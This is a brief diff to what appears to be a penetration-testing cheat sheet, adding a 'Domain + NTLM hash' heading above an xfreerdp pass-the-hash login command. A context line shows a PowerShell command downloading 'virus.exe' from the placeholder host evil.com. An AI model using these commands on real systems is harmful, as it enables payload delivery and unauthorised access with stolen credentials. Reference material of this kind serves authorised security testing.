@@ -52,6 +52,8 @@ System.Net.WebClient).DownloadFile('http://evil.com/virus.exe',
 
 ### xfreerdp
 
+#### Domain + NTLM hash
+
 ```csharp
 xfreerdp /d:domain  /u:user  /pth:NTLM_HASH  /v:DEST_IP
 ```
